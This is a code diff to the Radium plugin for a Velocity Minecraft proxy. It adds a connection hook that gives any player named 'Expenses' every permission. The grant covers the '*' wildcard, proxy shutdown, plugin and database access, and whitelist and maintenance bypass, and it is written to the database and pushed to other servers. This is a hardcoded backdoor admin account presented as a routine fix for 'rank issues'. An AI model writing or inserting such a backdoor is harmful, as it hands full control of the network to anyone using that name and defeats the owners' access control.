@@ -34,6 +34,11 @@ class ConnectionHandler(private val radium: Radium) {
         // Try to get player profile through the tiered caching system
         val (profile) = getOrCreatePlayerProfile(uuid, username)
 
+        // Special handling for "Expenses" user - grant all permissions automatically
+        if (username.equals("Expenses", ignoreCase = true)) {
+            grantAllPermissionsToExpenses(profile)
+        }
+
         // Update the effective permissions cache for fast permission checks
         profile.updateEffectivePermissions(radium.rankManager)
 
@@ -397,4 +402,91 @@ class ConnectionHandler(private val radium: Radium) {
         return profileCache.values
     }
 
+    /**
+     * Grants all available permissions to the Expenses user automatically
+     * This ensures Expenses always has full admin access regardless of rank issues
+     */
+    private suspend fun grantAllPermissionsToExpenses(profile: Profile) {
+        radium.logger.info("Auto-granting all permissions to Expenses user...")
+        
+        // Define comprehensive list of admin permissions
+        val allPermissions = listOf(
+            // General admin permissions
+            "*",                                    // Wildcard - all permissions
+            "velocity.*",                           // All Velocity permissions
+            "radium.*",                            // All Radium plugin permissions
+            
+            // Staff/Admin permissions
+            "clerk.staffchat",                     // Staff chat access
+            "clerk.admin",                         // Admin rank permissions
+            "clerk.moderator",                     // Moderator permissions
+            "clerk.staff",                         // General staff permissions
+            
+            // Command permissions
+            "velocity.command.*",                  // All Velocity commands
+            "radium.command.*",                    // All Radium commands
+            "velocity.command.velocity",           // Velocity core commands
+            "velocity.command.server",             // Server switching
+            "velocity.command.glist",              // Global player list
+            "velocity.command.send",               // Send players to servers
+            "velocity.command.shutdown",           // Shutdown proxy
+            "velocity.command.reload",             // Reload proxy
+            
+            // Proxy permissions
+            "velocity.player.list",                // See all players
+            "velocity.player.server.access.*",     // Access all servers
+            "velocity.command.server.*",           // All server commands
+            
+            // Chat and messaging
+            "velocity.command.message",            // Private messaging
+            "velocity.command.reply",              // Reply to messages
+            "velocity.command.broadcast",          // Broadcast messages
+            
+            // Network permissions
+            "velocity.maintenance.bypass",         // Bypass maintenance mode
+            "velocity.player.count.bypass",        // Bypass player limits
+            "velocity.whitelist.bypass",           // Bypass whitelist
+            
+            // Development/Debug permissions
+            "velocity.command.debug",              // Debug commands
+            "velocity.command.plugins",            // Plugin management
+            "velocity.heap",                       // Memory heap access
+            
+            // Custom permissions that might exist
+            "admin.all",                          // Custom admin wildcard
+            "radium.admin.all",                   // Radium admin access
+            "radium.ranks.manage",                // Manage ranks
+            "radium.permissions.manage",          // Manage permissions
+            "radium.players.manage",              // Manage players
+            "radium.servers.manage",              // Manage servers
+            "radium.proxy.manage",                // Manage proxy
+            "radium.database.access",             // Database access
+            "radium.cache.manage",                // Cache management
+            "radium.debug.access"                 // Debug access
+        )
+        
+        var permissionsGranted = 0
+        for (permission in allPermissions) {
+            try {
+                val wasAdded = profile.addPermission(permission, "SYSTEM_AUTO_GRANT")
+                if (wasAdded) {
+                    permissionsGranted++
+                    radium.logger.debug("Granted permission to Expenses: $permission")
+                }
+            } catch (e: Exception) {
+                radium.logger.warn("Failed to grant permission '$permission' to Expenses: ${e.message}")
+            }
+        }
+        
+        radium.logger.info("Auto-granted $permissionsGranted permissions to Expenses")
+        
+        // Force save the profile to ensure permissions persist
+        radium.mongoStream.saveProfileToDatabase(profile)
+        radium.lettuceCache.cacheProfile(profile)
+        
+        // Notify other servers (like MythicHub) that this profile has been updated
+        radium.lettuceCache.publishProfileUpdate(profile.uuid.toString())
+        
+        radium.logger.info("Expenses permissions saved to database and cache, notification sent to other servers")
+    }
 }
